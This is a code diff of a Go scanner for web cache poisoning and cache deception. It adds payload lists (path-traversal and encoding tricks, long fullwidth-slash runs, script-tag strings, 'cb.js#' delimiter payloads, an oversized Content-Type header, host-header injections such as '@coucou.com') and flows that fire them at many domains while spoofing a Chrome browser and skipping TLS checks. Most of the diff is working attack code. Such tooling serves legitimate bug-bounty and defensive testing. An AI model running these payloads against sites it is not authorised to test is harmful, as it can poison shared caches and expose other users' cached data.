@@ -2,6 +2,7 @@ package main
 
 import (
 	"bufio"
+	"context"
 	"crypto/tls"
 	"flag"
 	"fmt"
@@ -55,6 +56,10 @@ var (
 	domainWorkers  *int     // flag for number of concurrent domain workers
 	useProxy       *bool    // flag for using local proxy
 	showStats      *bool    // flag for showing stats at the end
+	normalFlow     *bool    // flag for using normal flow
+	delimiterFlow  *bool    // flag for using delimiter flow
+	headerFlow     *bool    // flag for using header testing flow
+	hostHeaderFlow *bool    // flag for using host header testing flow
 	directConnPool sync.Map // connection pool for direct requests
 	stats          struct {
 		sync.Mutex
@@ -77,31 +82,70 @@ var domainBlacklist = []string{
 }
 
 var payloads = []string{
-	// "..;%2fcb/../",
+	"cb" + strings.Repeat("／", 500) + "/..%2f",
+	"cb" + strings.Repeat("／", 1000) + "/..%2f",
+	"cb" + strings.Repeat("／", 3000) + "/..%2f",
+	"cb" + strings.Repeat("／", 5000) + "/..%2f",
+	"cb" + strings.Repeat("／", 7000) + "/..%2f",
+	"cb" + strings.Repeat("／", 15000) + "/..%2f",
+	"cb" + strings.Repeat("／", 31000) + "/..%2f",
+	"cb" + strings.Repeat("／", 40000) + "/..%2f",
+	"cb" + strings.Repeat("／", 500) + "/../",
+	"cb" + strings.Repeat("／", 1000) + "/../",
+	"cb" + strings.Repeat("／", 3000) + "/../",
+	"cb" + strings.Repeat("／", 5000) + "/../",
+	"cb" + strings.Repeat("／", 7000) + "/../",
+	"cb" + strings.Repeat("／", 15000) + "/../",
+	"cb" + strings.Repeat("／", 31000) + "/../",
+	"cb" + strings.Repeat("／", 40000) + "/../",
+	"..;%2fcb/..%2f",
 	"cb/..%2f",
-	// "..\x85%2fcb/../",
-	// "..\xA0%2fcb/../",
-	// "cb\\..\\",
-	// "cb.a%2f..%2f",
-	// "cb#/../",
-	// "cb#%2f..%2f",
-	// "cb;%2f..%2f",
-	// "cb$/../",
-	// "cb/../",
-	// "cb/./../",
-	// "cb%2fcb2/../",
-	// "cb／..／",
-	// "cb%5c..%5c",
-	// "cb/%2e%2e/",
-	// "cb%c0%af..%c0%af",
-	// "cb%252fcb2%2f..%2f",
-	// "cb\\cb2/../",
-	// "cb%5ccb2/../",
-	// "cb/%2e%2e/../../",
-	// "cb%0a/../",
-	// "cb%0a%2f..%2f",
-	// "cb%00/../",
-	// "cb%00%2f..%2f",
+	"..\x85%2fcb/..%2f",
+	"..\xA0%2fcb/../",
+	"cb\\..\\",
+	"cb.a%2f..%2f",
+	"cb#/..%2f",
+	"cb#\\..\\",
+	"cb%252f..\\..\\",
+	"cb;%2f..%2f",
+	"cb$/..%2f",
+	"cb/..%5c/../../",
+	"cb/../",
+	"cb/./../",
+	"cb%2fcb2/../",
+	"cb／..／",
+	"cb%5c..%5c",
+	"cb/%2e%2e/",
+	"cb%c0%af..%c0%af",
+	"cb%252fcb2%2f..%2f",
+	"cb\\cb2/../",
+	"cb%5ccb2/../",
+	"cb/%2e%2e/../../",
+	"cb%0a/../",
+	"cb%0a%2f..%2f",
+	"cb%00/../",
+	"cb%00%2f..%2f",
+	"<script>alert()/../",
+	"<script>alert()/..%2f",
+}
+
+var delimiterPayloads = []string{
+	"cb.js#/../",
+	"cb.js#%2f..%2f",
+	"cb.js#/..%2f",
+	"cb.js#\\..\\",
+}
+
+var headerPayloads = []string{
+	"Content-Type: " + strings.Repeat("a", 257000),
+}
+
+var hostHeaderPayloads = []string{
+	":1234",
+	"#",
+	"@coucou.com",
+	";coucou.com",
+	"/coucou.com",
 }
 
 const maxBackoffDelay = 5 * time.Second
@@ -368,7 +412,7 @@ func printStats() {
 	}
 }
 
-func makeDirectRequest(urlStr string) (int64, *fasthttp.Response, error) {
+func makeDirectRequest(urlStr string, hostHeaderPayload ...string) (int64, *fasthttp.Response, error) {
 	start := time.Now()
 	var reqErr error
 	defer func() {
@@ -504,10 +548,16 @@ func makeDirectRequest(urlStr string) (int64, *fasthttp.Response, error) {
 		path = "/"
 	}
 
+	// Use modified host header if provided
+	hostHeader := u.Host
+	if len(hostHeaderPayload) > 0 {
+		hostHeader = u.Host + hostHeaderPayload[0]
+	}
+
 	req := fmt.Sprintf("GET %s HTTP/1.1\r\n"+
 		"Host: %s\r\n"+
 		"User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36\r\n"+
-		"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"+
+		"Accept: text/html, application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"+
 		"Accept-Language: en-US\r\n"+
 		"Accept-Encoding: \r\n"+
 		"Sec-Ch-Ua: \"Not A(Brand\";v=\"99\", \"Google Chrome\";v=\"131\", \"Chromium\";v=\"131\"\r\n"+
@@ -518,7 +568,7 @@ func makeDirectRequest(urlStr string) (int64, *fasthttp.Response, error) {
 		"Sec-Fetch-Site: none\r\n"+
 		"Sec-Fetch-User: ?1\r\n"+
 		"Upgrade-Insecure-Requests: 1\r\n"+
-		"Connection: keep-alive\r\n\r\n", path, u.Host)
+		"Connection: keep-alive\r\n\r\n", path, hostHeader)
 
 	if _, err := netConn.Write([]byte(req)); err != nil {
 		reqErr = err
@@ -587,7 +637,7 @@ func makeRequest(client *fasthttp.Client, urlStr string) (int64, *fasthttp.Respo
 	req.Header.SetMethod("GET")
 	req.Header.Set("Connection", "keep-alive")
 	req.Header.Set("User-Agent", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36")
-	req.Header.Set("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8")
+	req.Header.Set("Accept", "text/html, application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8")
 	req.Header.Set("Accept-Language", "en-US")
 	req.Header.Set("Accept-Encoding", "")
 	req.Header.Set("Sec-Ch-Ua", "\"Not A(Brand\";v=\"99\", \"Google Chrome\";v=\"131\", \"Chromium\";v=\"131\"")
@@ -599,22 +649,40 @@ func makeRequest(client *fasthttp.Client, urlStr string) (int64, *fasthttp.Respo
 	req.Header.Set("Sec-Fetch-User", "?1")
 	req.Header.Set("Upgrade-Insecure-Requests", "1")
 
-	err := client.DoTimeout(req, resp, 10*time.Second)
-	if err != nil {
-		reqErr = err
-		if strings.Contains(err.Error(), "timeout") ||
-			strings.Contains(err.Error(), "deadline exceeded") ||
-			strings.Contains(err.Error(), "EOF") ||
-			strings.Contains(err.Error(), "connection reset by peer") ||
-			strings.Contains(err.Error(), "broken pipe") ||
-			strings.Contains(err.Error(), "i/o timeout") ||
-			strings.Contains(err.Error(), "connection refused") ||
-			strings.Contains(err.Error(), "no route to host") {
-			if checkDomainTimeout(urlStr, true) {
-				return 0, nil, fmt.Errorf("domain error limit exceeded")
+	// Create a timeout context
+	ctx, cancel := context.WithTimeout(context.Background(), 10*time.Second)
+	defer cancel()
+
+	done := make(chan error, 1)
+	go func() {
+		err := client.Do(req, resp)
+		done <- err
+	}()
+
+	select {
+	case err := <-done:
+		if err != nil {
+			reqErr = err
+			if strings.Contains(err.Error(), "timeout") ||
+				strings.Contains(err.Error(), "deadline exceeded") ||
+				strings.Contains(err.Error(), "EOF") ||
+				strings.Contains(err.Error(), "connection reset by peer") ||
+				strings.Contains(err.Error(), "broken pipe") ||
+				strings.Contains(err.Error(), "i/o timeout") ||
+				strings.Contains(err.Error(), "connection refused") ||
+				strings.Contains(err.Error(), "no route to host") {
+				if checkDomainTimeout(urlStr, true) {
+					return 0, nil, fmt.Errorf("domain error limit exceeded")
+				}
 			}
+			return 0, nil, err
 		}
-		return 0, nil, err
+	case <-ctx.Done():
+		reqErr = ctx.Err()
+		if checkDomainTimeout(urlStr, true) {
+			return 0, nil, fmt.Errorf("domain error limit exceeded")
+		}
+		return 0, nil, fmt.Errorf("request timeout: %v", ctx.Err())
 	}
 
 	// Check for Akamai block
@@ -647,12 +715,19 @@ func getRequiredDifference(bodySize int64) int64 {
 	}
 }
 
+func truncateURL(urlStr string) string {
+	if len(urlStr) > 100 {
+		return urlStr[:100] + "..."
+	}
+	return urlStr
+}
+
 func processPayload(client *fasthttp.Client, targetURL, newURL, payload string, len1 int64) bool {
 	// Initial request with cache buster
 	randomStr := randString(8)
 	cacheBusterURL := targetURL
 
-	// Add trailing slash only if URL ends at domain level
+	// Add trailing slash if URL ends at domain level
 	u, err := url.Parse(targetURL)
 	if err == nil && (u.Path == "" || u.Path == "/") {
 		cacheBusterURL = strings.TrimSuffix(cacheBusterURL, "/") + "/"
@@ -665,7 +740,11 @@ func processPayload(client *fasthttp.Client, targetURL, newURL, payload string, 
 		cacheBusterURL += "?zzz=" + randomStr
 	}
 
-	printProgress("%s", cacheBusterURL)
+	if *verbose {
+		printVerbose("Testing payload '%s' on %s", truncatePayload(payload), truncateURL(targetURL))
+	}
+
+	printProgress("%s", truncateURL(cacheBusterURL))
 	len2, resp2, err := makeRequest(client, cacheBusterURL)
 	if resp2 != nil {
 		defer fasthttp.ReleaseResponse(resp2)
@@ -673,7 +752,7 @@ func processPayload(client *fasthttp.Client, targetURL, newURL, payload string, 
 	clearLine()
 
 	if err != nil {
-		printError("Making cache buster request to %s: %v", cacheBusterURL, err)
+		printError("Making cache buster request to %s: %v", truncateURL(cacheBusterURL), err)
 		return false
 	}
 
@@ -681,7 +760,7 @@ func processPayload(client *fasthttp.Client, targetURL, newURL, payload string, 
 	requiredDiff := getRequiredDifference(len1)
 	if abs(len1-len2) > requiredDiff {
 		if *verbose {
-			printVerbose("Cache buster caused size change for %s, skipping", targetURL)
+			printVerbose("Cache buster caused size change for %s, skipping", truncateURL(targetURL))
 		}
 		return false
 	}
@@ -695,7 +774,7 @@ func processPayload(client *fasthttp.Client, targetURL, newURL, payload string, 
 		payloadURL += "?zzz=" + randomStr
 	}
 
-	printProgress("%s", payloadURL)
+	printProgress("%s", truncateURL(payloadURL))
 	len3, resp3, err := makeRequest(client, payloadURL)
 	if resp3 != nil {
 		defer fasthttp.ReleaseResponse(resp3)
@@ -703,14 +782,14 @@ func processPayload(client *fasthttp.Client, targetURL, newURL, payload string, 
 	clearLine()
 
 	if err != nil {
-		printError("Making payload request to %s: %v", payloadURL, err)
+		printError("Making payload request to %s: %v", truncateURL(payloadURL), err)
 		return false
 	}
 
 	// If size didn't change with payload, skip
 	if abs(len2-len3) <= requiredDiff {
 		if *verbose {
-			printVerbose("Payload did not cause size change for %s, skipping", targetURL)
+			printVerbose("Payload did not cause size change for %s, skipping", truncateURL(targetURL))
 		}
 		return false
 	}
@@ -728,7 +807,7 @@ func processPayload(client *fasthttp.Client, targetURL, newURL, payload string, 
 		verifyURL += "?zzz=" + randomStr
 	}
 
-	printProgress("%s", verifyURL)
+	printProgress("%s", truncateURL(verifyURL))
 	len4, resp4, err := makeRequest(client, verifyURL)
 	if resp4 != nil {
 		defer fasthttp.ReleaseResponse(resp4)
@@ -736,20 +815,20 @@ func processPayload(client *fasthttp.Client, targetURL, newURL, payload string, 
 	clearLine()
 
 	if err != nil {
-		printError("Making verification request to %s: %v", verifyURL, err)
+		printError("Making verification request to %s: %v", truncateURL(verifyURL), err)
 		return false
 	}
 
 	// If size is similar between payload and no-payload with same cache buster
 	if abs(len3-len4) <= 30 {
 		printResult("[HIGH_PROBABILITY] Potential issue at %s with payload '%s' - len1=%d len2=%d len3=%d len4=%d (required diff: %d)",
-			targetURL, payload, len1, len2, len3, len4, requiredDiff)
+			truncateURL(targetURL), truncatePayload(payload), len1, len2, len3, len4, requiredDiff)
 		skippedURLs.Store(targetURL, SkipFoundIssue)
 		return true
 	}
 
 	if *verbose {
-		printVerbose("Issue not verified for %s, continuing with other payloads", targetURL)
+		printVerbose("Issue not verified for %s, continuing with other payloads", truncateURL(targetURL))
 	}
 	return false
 }
@@ -757,7 +836,7 @@ func processPayload(client *fasthttp.Client, targetURL, newURL, payload string, 
 func processURL(client *fasthttp.Client, targetURL, payload string) {
 	if reason, found := skippedURLs.Load(targetURL); found {
 		if *verbose {
-			printVerbose("Skipping %s: %s", targetURL, reason)
+			printVerbose("Skipping %s: %s", truncateURL(targetURL), reason)
 		}
 		return
 	}
@@ -765,7 +844,7 @@ func processURL(client *fasthttp.Client, targetURL, payload string) {
 	domain := extractDomain(targetURL)
 	if val, ok := domainTimeouts.Load(domain); ok && val.(int64) >= 30 {
 		if *verbose {
-			printVerbose("Skipping %s due to too many errors on domain", targetURL)
+			printVerbose("Skipping %s due to too many errors on domain", truncateURL(targetURL))
 		}
 		return
 	}
@@ -783,8 +862,80 @@ func processURL(client *fasthttp.Client, targetURL, payload string) {
 		newURL = targetURL + "/" + payload
 	}
 
-	printProgress("%s", targetURL)
+	printProgress("Testing payload '%s' on %s", truncatePayload(payload), truncateURL(targetURL))
 	body1, resp1, err := makeRequest(client, targetURL)
+	clearLine()
+
+	if err != nil {
+		if strings.Contains(err.Error(), "timeout") || strings.Contains(err.Error(), "deadline exceeded") ||
+			strings.Contains(err.Error(), "EOF") || strings.Contains(err.Error(), "i/o timeout") {
+			checkDomainTimeout(targetURL, true)
+		} else if strings.Contains(err.Error(), "no such host") ||
+			strings.Contains(err.Error(), "server closed connection") ||
+			strings.Contains(err.Error(), "connection refused") {
+			if *verbose {
+				printError("Connection error for %s: %v", truncateURL(targetURL), err)
+			}
+			skippedURLs.Store(targetURL, SkipConnectionError)
+			return
+		}
+		if *verbose {
+			printError("Error making initial request to %s: %v", truncateURL(targetURL), err)
+		}
+		return
+	}
+
+	checkDomainTimeout(targetURL, false)
+
+	func() {
+		defer fasthttp.ReleaseResponse(resp1)
+
+		if !hasCacheHeaders(resp1) {
+			if *verbose {
+				printVerbose("No cache headers found for %s, skipping", truncateURL(targetURL))
+			}
+			skippedURLs.Store(targetURL, SkipNoCacheHeaders)
+			return
+		}
+
+		len1 := body1
+		processPayload(client, targetURL, newURL, payload, len1)
+	}()
+}
+
+func isAkamaiBlocked(resp *fasthttp.Response) bool {
+	return resp.StatusCode() == 403 && (string(resp.Header.Peek("Server")) == "AkamaiGHost" ||
+		string(resp.Header.Peek("Server")) == "AkamaiNetStorage" ||
+		string(resp.Header.Peek("Server")) == "DataDome")
+}
+
+func processDelimiter(client *fasthttp.Client, targetURL, payload string) {
+	if reason, found := skippedURLs.Load(targetURL); found {
+		if *verbose {
+			printVerbose("Skipping %s: %s", targetURL, reason)
+		}
+		return
+	}
+
+	domain := extractDomain(targetURL)
+	if val, ok := domainTimeouts.Load(domain); ok && val.(int64) >= 30 {
+		if *verbose {
+			printVerbose("Skipping %s due to too many errors on domain", targetURL)
+		}
+		return
+	}
+
+	// Add trailing slash if URL ends at domain level
+	var err error
+	var u *url.URL
+	u, err = url.Parse(targetURL)
+	if err == nil && (u.Path == "" || u.Path == "/") {
+		targetURL = strings.TrimSuffix(targetURL, "/") + "/"
+	}
+
+	// Make initial request
+	printProgress("%s", targetURL)
+	len1, resp1, err := makeRequest(client, targetURL)
 	clearLine()
 
 	if err != nil {
@@ -806,11 +957,213 @@ func processURL(client *fasthttp.Client, targetURL, payload string) {
 		return
 	}
 
-	checkDomainTimeout(targetURL, false)
-
-	func() {
+	if resp1 != nil {
 		defer fasthttp.ReleaseResponse(resp1)
+		// Check for redirects
+		if resp1.StatusCode() == 301 || resp1.StatusCode() == 302 {
+			if *verbose {
+				printVerbose("Skipping %s: returns redirect status %d", targetURL, resp1.StatusCode())
+			}
+			return
+		}
+	}
 
+	// Create URL with random string
+	u, err = url.Parse(targetURL)
+	if err != nil {
+		if *verbose {
+			printError("Error parsing URL %s: %v", targetURL, err)
+		}
+		return
+	}
+
+	// Split path into segments
+	segments := strings.Split(strings.Trim(u.Path, "/"), "/")
+	if len(segments) == 0 {
+		segments = []string{""}
+	}
+
+	// Get file extension if it exists
+	lastSegment := segments[len(segments)-1]
+	var extension string
+	if idx := strings.LastIndex(lastSegment, "."); idx != -1 {
+		extension = lastSegment[idx:]
+	}
+
+	// Create random URL (with extension if it exists)
+	var randomURL string
+	if idx := strings.LastIndex(targetURL, "/"); idx != -1 {
+		if idx <= len("https://") {
+			randomURL = targetURL + randString(8)
+		} else {
+			randomURL = targetURL[:idx+1] + randString(8)
+		}
+	} else {
+		randomURL = targetURL + "/" + randString(8)
+	}
+	if extension != "" {
+		randomURL += extension
+	}
+
+	// Make request with random string
+	printProgress("%s", randomURL)
+	lenRandom, respRandom, err := makeRequest(client, randomURL)
+	clearLine()
+
+	if err != nil {
+		if *verbose {
+			printError("Error making random request to %s: %v", randomURL, err)
+		}
+		return
+	}
+
+	if respRandom != nil {
+		defer fasthttp.ReleaseResponse(respRandom)
+	}
+
+	// If lengths are similar (allowing 30 chars difference for first check)
+	if abs(len1-lenRandom) <= 30 {
+		if *verbose {
+			printVerbose("Random path returns similar size for %s, skipping", targetURL)
+		}
+		return
+	}
+
+	// Create new URL with payload
+	var newURL string
+	if idx := strings.LastIndex(targetURL, "/"); idx != -1 {
+		if idx <= len("https://") {
+			newURL = targetURL + payload + segments[len(segments)-1]
+		} else {
+			newURL = targetURL[:idx+1] + payload + segments[len(segments)-1]
+		}
+	} else {
+		newURL = targetURL + "/" + payload + segments[len(segments)-1]
+	}
+
+	// Make request with payload
+	printProgress("%s", newURL)
+	len2, resp2, err := makeRequest(client, newURL)
+	clearLine()
+
+	if err != nil {
+		if *verbose {
+			printError("Error making payload request to %s: %v", newURL, err)
+		}
+		return
+	}
+
+	if resp2 != nil {
+		defer fasthttp.ReleaseResponse(resp2)
+	}
+
+	// If lengths are different (requiring exact match)
+	if len1 != len2 {
+		if *verbose {
+			printVerbose("Length difference detected for %s", targetURL)
+		}
+		return
+	}
+
+	// Create cb.js URL
+	var cbURL string
+	if idx := strings.LastIndex(targetURL, "/"); idx != -1 {
+		if idx <= len("https://") {
+			cbURL = targetURL + "cb.js"
+		} else {
+			cbURL = targetURL[:idx+1] + "cb.js"
+		}
+	} else {
+		cbURL = targetURL + "/cb.js"
+	}
+
+	// Make request with cb.js
+	printProgress("%s", cbURL)
+	len3, resp3, err := makeRequest(client, cbURL)
+	clearLine()
+
+	if err != nil {
+		if *verbose {
+			printError("Error making cb.js request to %s: %v", cbURL, err)
+		}
+		return
+	}
+
+	if resp3 != nil {
+		defer fasthttp.ReleaseResponse(resp3)
+	}
+
+	// If lengths are different (requiring exact match)
+	if len1 != len3 {
+		if *verbose {
+			printVerbose("Length difference detected for cb.js at %s", targetURL)
+		}
+		return
+	}
+
+	// All checks passed, we found something
+	printResult("Delimiter potential at %s with payload '%s' - original_len=%d payload_len=%d cb_len=%d",
+		targetURL, payload, len1, len2, len3)
+	skippedURLs.Store(targetURL, SkipFoundIssue)
+}
+
+func truncatePayload(payload string) string {
+	if len(payload) > 20 {
+		return payload[:20] + "..."
+	}
+	return payload
+}
+
+func processHeader(client *fasthttp.Client, targetURL, headerPayload string) {
+	if reason, found := skippedURLs.Load(targetURL); found {
+		if *verbose {
+			printVerbose("Skipping %s: %s", targetURL, reason)
+		}
+		return
+	}
+
+	domain := extractDomain(targetURL)
+	if val, ok := domainTimeouts.Load(domain); ok && val.(int64) >= 30 {
+		if *verbose {
+			printVerbose("Skipping %s due to too many errors on domain", targetURL)
+		}
+		return
+	}
+
+	// Add trailing slash if URL ends at domain level
+	var err error
+	var u *url.URL
+	u, err = url.Parse(targetURL)
+	if err == nil && (u.Path == "" || u.Path == "/") {
+		targetURL = strings.TrimSuffix(targetURL, "/") + "/"
+	}
+
+	// Make initial request
+	printProgress("%s", targetURL)
+	len1, resp1, err := makeRequest(client, targetURL)
+	clearLine()
+
+	if err != nil {
+		if strings.Contains(err.Error(), "timeout") || strings.Contains(err.Error(), "deadline exceeded") ||
+			strings.Contains(err.Error(), "EOF") || strings.Contains(err.Error(), "i/o timeout") {
+			checkDomainTimeout(targetURL, true)
+		} else if strings.Contains(err.Error(), "no such host") ||
+			strings.Contains(err.Error(), "server closed connection") ||
+			strings.Contains(err.Error(), "connection refused") {
+			if *verbose {
+				printError("Connection error for %s: %v", targetURL, err)
+			}
+			skippedURLs.Store(targetURL, SkipConnectionError)
+			return
+		}
+		if *verbose {
+			printError("Error making initial request to %s: %v", targetURL, err)
+		}
+		return
+	}
+
+	if resp1 != nil {
+		defer fasthttp.ReleaseResponse(resp1)
 		if !hasCacheHeaders(resp1) {
 			if *verbose {
 				printVerbose("No cache headers found for %s, skipping", targetURL)
@@ -818,16 +1171,291 @@ func processURL(client *fasthttp.Client, targetURL, payload string) {
 			skippedURLs.Store(targetURL, SkipNoCacheHeaders)
 			return
 		}
+	}
 
-		len1 := body1
-		processPayload(client, targetURL, newURL, payload, len1)
-	}()
+	// Create URL with random query parameter
+	u, err = url.Parse(targetURL)
+	if err != nil {
+		if *verbose {
+			printError("Error parsing URL %s: %v", targetURL, err)
+		}
+		return
+	}
+
+	// Add random query parameter
+	q := u.Query()
+	q.Set("zzz", randString(8))
+	u.RawQuery = q.Encode()
+	randomURL := u.String()
+
+	// Make request with random query parameter
+	printProgress("%s", randomURL)
+	len2, resp2, err := makeRequest(client, randomURL)
+	clearLine()
+
+	if err != nil {
+		if *verbose {
+			printError("Error making random query request to %s: %v", randomURL, err)
+		}
+		return
+	}
+
+	if resp2 != nil {
+		defer fasthttp.ReleaseResponse(resp2)
+	}
+
+	// If lengths are different, skip (allowing 30 chars difference)
+	if abs(len1-len2) > 30 {
+		if *verbose {
+			printVerbose("Random query parameter caused size change for %s, skipping", targetURL)
+		}
+		return
+	}
+
+	// Parse header payload
+	headerParts := strings.SplitN(headerPayload, ": ", 2)
+	if len(headerParts) != 2 {
+		if *verbose {
+			printError("Invalid header payload format: %s", headerPayload)
+		}
+		return
+	}
+	headerName := headerParts[0]
+	headerValue := headerParts[1]
+
+	// Create new request with header
+	req := fasthttp.AcquireRequest()
+	defer fasthttp.ReleaseRequest(req)
+
+	// Add new random query parameter
+	q.Set("zzz", randString(8))
+	u.RawQuery = q.Encode()
+	headerURL := u.String()
+
+	req.SetRequestURI(headerURL)
+	req.Header.SetMethod("GET")
+	req.Header.Set("Connection", "keep-alive")
+	req.Header.Set("User-Agent", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36")
+	req.Header.Set("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8")
+	req.Header.Set("Accept-Language", "en-US")
+	req.Header.Set("Accept-Encoding", "")
+	req.Header.Set("Sec-Ch-Ua", "\"Not A(Brand\";v=\"99\", \"Google Chrome\";v=\"131\", \"Chromium\";v=\"131\"")
+	req.Header.Set("Sec-Ch-Ua-Mobile", "?0")
+	req.Header.Set("Sec-Ch-Ua-Platform", "\"macOS\"")
+	req.Header.Set("Sec-Fetch-Dest", "document")
+	req.Header.Set("Sec-Fetch-Mode", "navigate")
+	req.Header.Set("Sec-Fetch-Site", "none")
+	req.Header.Set("Sec-Fetch-User", "?1")
+	req.Header.Set("Upgrade-Insecure-Requests", "1")
+	req.Header.Set(headerName, headerValue)
+
+	// Make request with header
+	printProgress("%s", headerURL)
+	resp3 := fasthttp.AcquireResponse()
+	err = client.Do(req, resp3)
+	clearLine()
+
+	if err != nil {
+		if *verbose {
+			printError("Error making header request to %s: %v", headerURL, err)
+		}
+		fasthttp.ReleaseResponse(resp3)
+		return
+	}
+
+	len3 := int64(resp3.Header.ContentLength())
+	if len3 <= 0 {
+		len3 = int64(len(resp3.Body()))
+	}
+	fasthttp.ReleaseResponse(resp3)
+
+	// If lengths are similar, skip
+	if len1 == len3 {
+		if *verbose {
+			printVerbose("Header did not cause size change for %s, skipping", targetURL)
+		}
+		return
+	}
+
+	// Make request with same query parameter
+	printProgress("%s", headerURL)
+	len4, resp4, err := makeRequest(client, headerURL)
+	clearLine()
+
+	if err != nil {
+		if *verbose {
+			printError("Error making verification request to %s: %v", headerURL, err)
+		}
+		return
+	}
+
+	if resp4 != nil {
+		defer fasthttp.ReleaseResponse(resp4)
+	}
+
+	// If lengths are similar to the header request, we found something
+	if len3 == len4 {
+		printResult("Header potential at %s with header '%s' - original_len=%d random_len=%d header_len=%d verify_len=%d",
+			targetURL, truncatePayload(headerPayload), len1, len2, len3, len4)
+		skippedURLs.Store(targetURL, SkipFoundIssue)
+	}
 }
 
-func isAkamaiBlocked(resp *fasthttp.Response) bool {
-	return resp.StatusCode() == 403 && (string(resp.Header.Peek("Server")) == "AkamaiGHost" ||
-		string(resp.Header.Peek("Server")) == "AkamaiNetStorage" ||
-		string(resp.Header.Peek("Server")) == "DataDome")
+func processHostHeader(client *fasthttp.Client, targetURL, hostPayload string) {
+	if reason, found := skippedURLs.Load(targetURL); found {
+		if *verbose {
+			printVerbose("Skipping %s: %s", targetURL, reason)
+		}
+		return
+	}
+
+	domain := extractDomain(targetURL)
+	if val, ok := domainTimeouts.Load(domain); ok && val.(int64) >= 30 {
+		if *verbose {
+			printVerbose("Skipping %s due to too many errors on domain", targetURL)
+		}
+		return
+	}
+
+	// Add trailing slash if URL ends at domain level
+	var err error
+	var u *url.URL
+	u, err = url.Parse(targetURL)
+	if err == nil && (u.Path == "" || u.Path == "/") {
+		targetURL = strings.TrimSuffix(targetURL, "/") + "/"
+	}
+
+	// Make initial request
+	printProgress("%s", targetURL)
+	len1, resp1, err := makeRequest(client, targetURL)
+	clearLine()
+
+	if err != nil {
+		if strings.Contains(err.Error(), "timeout") || strings.Contains(err.Error(), "deadline exceeded") ||
+			strings.Contains(err.Error(), "EOF") || strings.Contains(err.Error(), "i/o timeout") {
+			checkDomainTimeout(targetURL, true)
+		} else if strings.Contains(err.Error(), "no such host") ||
+			strings.Contains(err.Error(), "server closed connection") ||
+			strings.Contains(err.Error(), "connection refused") {
+			if *verbose {
+				printError("Connection error for %s: %v", targetURL, err)
+			}
+			skippedURLs.Store(targetURL, SkipConnectionError)
+			return
+		}
+		if *verbose {
+			printError("Error making initial request to %s: %v", targetURL, err)
+		}
+		return
+	}
+
+	if resp1 != nil {
+		defer fasthttp.ReleaseResponse(resp1)
+		if !hasCacheHeaders(resp1) {
+			if *verbose {
+				printVerbose("No cache headers found for %s, skipping", targetURL)
+			}
+			skippedURLs.Store(targetURL, SkipNoCacheHeaders)
+			return
+		}
+	}
+
+	// Create URL with random query parameter
+	u, err = url.Parse(targetURL)
+	if err != nil {
+		if *verbose {
+			printError("Error parsing URL %s: %v", targetURL, err)
+		}
+		return
+	}
+
+	// Add random query parameter
+	q := u.Query()
+	q.Set("zzz", randString(8))
+	u.RawQuery = q.Encode()
+	randomURL := u.String()
+
+	// Make request with random query parameter
+	printProgress("%s", randomURL)
+	len2, resp2, err := makeRequest(client, randomURL)
+	clearLine()
+
+	if err != nil {
+		if *verbose {
+			printError("Error making random query request to %s: %v", randomURL, err)
+		}
+		return
+	}
+
+	if resp2 != nil {
+		defer fasthttp.ReleaseResponse(resp2)
+	}
+
+	// If lengths are different, skip (allowing 30 chars difference)
+	if abs(len1-len2) > 30 {
+		if *verbose {
+			printVerbose("Random query parameter caused size change for %s, skipping", targetURL)
+		}
+		return
+	}
+
+	// Create new request with modified host header
+	req := fasthttp.AcquireRequest()
+	defer fasthttp.ReleaseRequest(req)
+
+	// Add new random query parameter
+	q.Set("zzz", randString(8))
+	u.RawQuery = q.Encode()
+	hostURL := u.String()
+
+	// Make request with modified host header using makeDirectRequest
+	printProgress("%s", hostURL)
+	len3, resp3, err := makeDirectRequest(hostURL, hostPayload)
+	if resp3 != nil {
+		defer fasthttp.ReleaseResponse(resp3)
+	}
+	clearLine()
+
+	if err != nil {
+		if *verbose {
+			printError("Error making host header request to %s: %v", hostURL, err)
+		}
+		return
+	}
+
+	// Get required difference based on response size
+	requiredDiff := getRequiredDifference(len2)
+
+	// If size didn't change with host header, skip
+	if abs(len2-len3) <= requiredDiff {
+		if *verbose {
+			printVerbose("Host header did not cause size change for %s, skipping", targetURL)
+		}
+		return
+	}
+
+	// Make request with same query parameter
+	printProgress("%s", hostURL)
+	len4, resp4, err := makeRequest(client, hostURL)
+	clearLine()
+
+	if err != nil {
+		if *verbose {
+			printError("Error making verification request to %s: %v", hostURL, err)
+		}
+		return
+	}
+
+	if resp4 != nil {
+		defer fasthttp.ReleaseResponse(resp4)
+	}
+
+	// If lengths are similar to the host header request, we found something
+	if abs(len3-len4) <= 30 {
+		printResult("Host header potential at %s with payload '%s' - original_len=%d random_len=%d host_len=%d verify_len=%d (required diff: %d)",
+			targetURL, truncatePayload(hostPayload), len1, len2, len3, len4, requiredDiff)
+		skippedURLs.Store(targetURL, SkipFoundIssue)
+	}
 }
 
 func main() {
@@ -836,7 +1464,16 @@ func main() {
 	veryVerbose = flag.Bool("vv", false, "Show all logging (current verbose)")
 	domainWorkers = flag.Int("t", 10, "Number of concurrent domain workers")
 	showStats = flag.Bool("s", false, "Show statistics at the end")
+	normalFlow = flag.Bool("P", false, "Use path testing flow")
+	delimiterFlow = flag.Bool("D", false, "Use delimiter testing flow")
+	headerFlow = flag.Bool("H", false, "Use header testing flow")
+	hostHeaderFlow = flag.Bool("HH", false, "Use host header testing flow")
 	flag.Parse()
+
+	if !*normalFlow && !*delimiterFlow && !*headerFlow && !*hostHeaderFlow {
+		fmt.Println("Error: Must specify at least one flow with -P, -D, or -H flag")
+		os.Exit(1)
+	}
 
 	if *veryVerbose {
 		*verbose = true
@@ -849,17 +1486,17 @@ func main() {
 			InsecureSkipVerify: true,
 			ClientSessionCache: tls.NewLRUClientSessionCache(1000),
 		},
-		ReadTimeout:         4 * time.Second,
-		WriteTimeout:        4 * time.Second,
-		MaxIdleConnDuration: 5 * time.Second,
-		MaxConnDuration:     10 * time.Second,
